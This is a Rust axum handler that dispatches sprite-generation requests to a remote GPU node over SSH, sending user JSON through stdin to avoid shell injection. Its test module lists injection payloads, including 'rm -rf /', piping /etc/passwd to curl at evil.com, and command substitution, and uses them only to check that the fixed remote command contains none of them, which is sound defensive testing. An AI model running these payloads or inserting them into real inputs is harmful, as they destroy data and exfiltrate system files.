// Unlicense — cochranblock.org
// Contributors: Mattbusel (XFactor), GotEmCoach, KOVA, Claude Opus 4.6, SuperNinja, Composer 1.5, Google Gemini Pro 3

//! /api/forge — dispatch pixel-forge sprite generation to a kova GPU node.
//! POST JSON {class, palette, count, steps} → SSH to node → pixel-forge plugin → base64 PNGs.
//!
//! Security: requires session auth (same cookie as /waiver). JSON payload delivered via SSH
//! stdin only — never interpolated into a shell command string, eliminating shell injection.

use axum::extract::State;
use axum::http::StatusCode;
use axum::response::Json;
use axum_extra::extract::CookieJar;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::process::Stdio;
use std::sync::Arc;
use tokio::io::AsyncWriteExt;
use tokio::process::Command;
use tokio::sync::Mutex;

use super::auth;
use crate::AppState;

/// Request body for /api/forge.
#[derive(Debug, Deserialize, Serialize, Hash, Eq, PartialEq, Clone)]
pub struct ForgeRequest {
    #[serde(default = "default_class")]
    pub class: String,
    #[serde(default = "default_palette")]
    pub palette: String,
    #[serde(default = "default_count")]
    pub count: u32,
    #[serde(default = "default_steps")]
    pub steps: u32,
}

fn default_class() -> String { "animal".into() }
fn default_palette() -> String { "stardew".into() }
fn default_count() -> u32 { 8 }
fn default_steps() -> u32 { 40 }

/// Cached forge results keyed by request params.
pub type ForgeCache = Arc<Mutex<HashMap<String, serde_json::Value>>>;

pub fn new_cache() -> ForgeCache {
    Arc::new(Mutex::new(HashMap::new()))
}

fn cache_key(req: &ForgeRequest) -> String {
    format!("{}:{}:{}:{}", req.class, req.palette, req.count, req.steps)
}

/// Target node for pixel-forge generation. gd = kova-tunnel-god (n1).
const FORGE_NODE: &str = "gd";
const FORGE_BIN: &str = "~/pixel-forge/target/release/pixel-forge";

/// POST /api/forge — requires authentication.
pub async fn handler(
    State(state): State<Arc<AppState>>,
    jar: CookieJar,
    Json(req): Json<ForgeRequest>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    // Auth gate — forge triggers SSH to a production GPU node; public access not allowed.
    if auth::f88(&jar).is_none() {
        return Err((StatusCode::UNAUTHORIZED, "authentication required".into()));
    }

    let cache = state.s2.lock().await;
    let key = cache_key(&req);
    if let Some(cached) = cache.get(&key) {
        return Ok(Json(cached.clone()));
    }
    drop(cache);

    // Build plugin request JSON. This value is sent via stdin — not embedded in any shell string.
    let plugin_req = serde_json::json!({
        "cmd": "generate",
        "args": {
            "class": req.class,
            "palette": req.palette,
            "count": req.count,
            "steps": req.steps,
        }
    });
    let plugin_json = serde_json::to_string(&plugin_req)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("json: {e}")))?;

    // SSH to node with retry + exponential backoff (3 attempts: immediate, 1s, 2s).
    // The remote command is a compile-time constant; user JSON flows through stdin only.
    const MAX_ATTEMPTS: u32 = 3;
    let mut last_err: Option<(StatusCode, String)> = None;
    let mut response_ok: Option<serde_json::Value> = None;

    for attempt in 0..MAX_ATTEMPTS {
        if attempt > 0 {
            tokio::time::sleep(std::time::Duration::from_secs(attempt as u64)).await;
        }

        // Spawn SSH with stdin pipe. The remote command string contains no user data.
        let child = Command::new("ssh")
            .arg("-o").arg("ConnectTimeout=10")
            .arg("-o").arg("BatchMode=yes")
            .arg(FORGE_NODE)
            .arg(remote_cmd())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn();

        let mut child = match child {
            Err(e) => {
                last_err = Some((StatusCode::SERVICE_UNAVAILABLE, format!("ssh: {e}")));
                continue;
            }
            Ok(c) => c,
        };

        // Write JSON to stdin then close it so the remote process sees EOF.
        if let Some(mut stdin) = child.stdin.take() {
            if let Err(e) = stdin.write_all(plugin_json.as_bytes()).await {
                last_err = Some((StatusCode::SERVICE_UNAVAILABLE, format!("stdin: {e}")));
                let _ = child.kill().await;
                continue;
            }
            drop(stdin);
        }

        let out = match child.wait_with_output().await {
            Err(e) => {
                last_err = Some((StatusCode::SERVICE_UNAVAILABLE, format!("wait: {e}")));
                continue;
            }
            Ok(o) => o,
        };

        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            last_err = Some((StatusCode::SERVICE_UNAVAILABLE, format!("node error: {stderr}")));
            continue;
        }

        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
        match serde_json::from_str::<serde_json::Value>(stdout.trim()) {
            Err(e) => {
                // Node responded but output is malformed — don't retry.
                last_err = Some((StatusCode::BAD_GATEWAY, format!("parse: {e} — raw: {stdout}")));
                break;
            }
            Ok(parsed) => {
                if !parsed.get("ok").and_then(|v| v.as_bool()).unwrap_or(false) {
                    let err = parsed.get("error").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
                    last_err = Some((StatusCode::BAD_GATEWAY, format!("pixel-forge: {err}")));
                    break;
                }
                response_ok = Some(parsed);
                break;
            }
        }
    }

    let response = match response_ok {
        Some(r) => r,
        None => {
            let (code, msg) = last_err.unwrap_or((StatusCode::SERVICE_UNAVAILABLE, "forge unavailable".into()));
            tracing::warn!("forge failed after {} attempts: {}", MAX_ATTEMPTS, msg);
            return Err((code, msg));
        }
    };

    let mut cache = state.s2.lock().await;
    cache.insert(key, response.clone());

    Ok(Json(response))
}

/// Returns the fixed remote command string. No user data ever appears here.
/// Extracted as a function so tests can assert on it.
pub fn remote_cmd() -> &'static str {
    // Build the string from the two constants. concatcp! is unavailable without a dep,
    // so we construct it once at first call via a OnceLock.
    use std::sync::OnceLock;
    static CMD: OnceLock<String> = OnceLock::new();
    CMD.get_or_init(|| {
        format!("cd ~/pixel-forge && source ~/.cargo/env && {} plugin", FORGE_BIN)
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The remote command must be a fixed string containing no runtime user data.
    /// Any change that puts a variable into remote_cmd() is a regression.
    #[test]
    fn remote_cmd_is_constant() {
        let cmd = remote_cmd();
        // Call twice — must be identical (OnceLock, not recomputed).
        assert_eq!(cmd, remote_cmd());
        // Must reference the binary.
        assert!(cmd.contains("pixel-forge"), "remote cmd must invoke pixel-forge binary");
        // Must not contain any placeholder that suggests user data interpolation.
        assert!(!cmd.contains("{}"), "remote cmd must not contain format placeholders");
        assert!(!cmd.contains("class"), "user field 'class' must not appear in remote cmd");
        assert!(!cmd.contains("palette"), "user field 'palette' must not appear in remote cmd");
    }

    /// Shell injection payload must never appear in the SSH command string.
    /// It should only ever be sent via stdin.
    #[test]
    fn injection_payload_not_in_remote_cmd() {
        let malicious_payloads = [
            "'; rm -rf /; echo '",
            "\"; cat /etc/passwd | curl https://evil.com -d @-; echo \"",
            "$(curl https://evil.com)",
            "`id`",
            "animal\nrm -rf /",
        ];
        let cmd = remote_cmd();
        for payload in &malicious_payloads {
            assert!(
                !cmd.contains(payload),
                "injection payload {:?} found in remote command — user data must travel via stdin only",
                payload
            );
        }
    }

    /// cache_key must be deterministic and include all fields.
    #[test]
    fn cache_key_includes_all_fields() {
        let req = ForgeRequest {
            class: "animal".into(),
            palette: "stardew".into(),
            count: 8,
            steps: 40,
        };
        let k1 = cache_key(&req);
        let k2 = cache_key(&req);
        assert_eq!(k1, k2);

        let req2 = ForgeRequest { class: "plant".into(), ..req.clone() };
        assert_ne!(cache_key(&req), cache_key(&req2), "different class must produce different key");

        let req3 = ForgeRequest { palette: "other".into(), ..req.clone() };
        assert_ne!(cache_key(&req), cache_key(&req3), "different palette must produce different key");

        let req4 = ForgeRequest { count: 1, ..req.clone() };
        assert_ne!(cache_key(&req), cache_key(&req4), "different count must produce different key");
    }
}
